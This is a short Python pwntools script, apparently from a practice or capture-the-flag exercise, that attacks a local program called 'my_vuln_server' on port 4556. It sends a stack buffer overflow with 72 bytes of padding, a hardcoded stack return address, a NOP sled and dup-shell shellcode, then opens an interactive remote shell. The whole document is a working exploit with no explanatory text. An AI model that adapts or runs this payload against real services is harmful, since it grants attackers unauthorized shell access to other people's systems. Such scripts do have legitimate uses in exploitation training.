from pwn import *
import struct

IP = "127.0.0.1"
port = 4556

elf = context.binary = ELF("./my_vuln_server")

#p = elf.process()
p = remote(IP, port)

# offset 72
# payload = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9"
payload = b"A" * (64 + 8)
# last = struct.pack('<Q', 0x00007fffffffdb40) # inside gdb
payload += struct.pack('<Q', 0x00007fffffffdb90) # outside gdb
payload += b"\x90" * 20
payload += asm(shellcraft.amd64.linux.dupsh(4))


p.sendline(payload)
#p.recvall(64)
p.interactive()
p.close
